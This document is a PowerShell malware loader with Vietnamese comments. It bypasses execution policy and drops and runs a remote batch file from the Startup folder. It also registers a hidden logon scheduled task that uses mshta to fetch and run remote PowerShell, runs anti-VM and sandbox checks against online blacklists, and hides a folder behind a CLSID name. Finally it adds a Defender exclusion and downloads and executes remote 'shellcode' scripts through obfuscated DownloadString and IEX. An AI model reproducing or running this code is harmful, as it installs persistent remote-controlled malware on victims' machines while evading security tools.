



Set-ExecutionPolicy Bypass -Scope Process -Force

$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("Startup")
Add-Type -AssemblyName System.Windows.Forms

$skid = "skid"

# Kiểm tra xem script có quyền quản trị không
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Tải xuống tệp batch
        
        $outputFile = "$startupfolder\download.bat"
        
        # Kiểm tra mức độ UAC và in thông báo
        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
        Write-Output "Khởi chạy tệp batch."
        
        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
        Write-Output "Kết thúc tiến trình PowerShell."
        Stop-Process -Id $PID -Force
    }
    catch {
        Write-Error "Lỗi xảy ra: $_"
    }
}

$task_name = "Wkrean"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
Write-Host "[!] Persistence Added" -ForegroundColor Green

Remove-Item -Path "$startupfolder\download.bat" -Force



function Check-Condition {
    param (
        [scriptblock]$condition,
        [string]$errorMessage
    )
    if (& $condition) {
        Write-Host "[!] $errorMessage" -ForegroundColor Red
        Stop-Process $pid -Force
    }
}

function Search-Mac { (gcm gwm*) win32_networkadapterconfiguration | Where-Object { $_.IpEnabled } | Select-Object -ExpandProperty macaddress -join "," }
function Search-IP { (gcm I*e-Web*t*) -Uri "https://api.ipify.org" -UseBasicParsing | Select-Object -ExpandProperty Content }
function Search-HWID { (gcm gwm*) -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID }
function Search-Username { [Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1] }
function Check-Internet { Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop }
function Check-DriveSize { (Get-Volume | Where-Object { $_.DriveLetter } | Measure-Object -Property Size -Sum).Sum / 1GB -ge 50 }
function Check-RAM { (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB -ge 6 }
function Check-ProcessCount { (gps | Measure-Object).Count -ge 50 }
function Check-RecentFiles { (Get-ChildItem -Path "$ENV:APPDATA\Microsoft\Windows\Recent" -Recurse).Count -ge 20 }

function VMPROTECT {
    Check-Condition { Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll" } "JSAMSIProvider64.dll"
    Check-Condition { Check-RAM -eq $false } "RAM CHECK FAILED!"
    Check-Condition { (wmic diskdrive get model) -like "*DADY HARDDISK*" -or (wmic diskdrive get model) -like "*QEMU HARDDISK*" } "QEMU HARDDISK"
    
    $urls = @("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt", "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt", "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt")
    $data = @(
        Search-Mac,
        Search-IP,
        Search-HWID
    )
    foreach ($url in $urls) {
        $blacklist = (gcm I*e-Web*t*) -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
        if ($blacklist -split "`n" | Where-Object { $data -contains $_ }) {
            Write-Host "[!] Blacklisted item detected" -ForegroundColor Red
            Stop-Process $pid -Force
        }
    }
    
    Check-Condition { Check-Internet -eq $false } "INTERNET CONNECTION CHECK FAILED!"
    Check-Condition { Check-ProcessCount -eq $false } "PROCESS COUNT CHECK FAILED!"
    Check-Condition { Check-RecentFiles -eq $false } "RECENT FILE ACTIVITY CHECK FAILED!"
    Check-Condition { Check-DriveSize -eq $false } "DRIVE SIZE CHECK FAILED!"
}

VMPROTECT


$rdir = "C:\Users\Loader"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Add-MpPreference -ExclusionPath $dir


$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode1.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

# if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
#     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
#     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$datacode')"
#     Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
# }
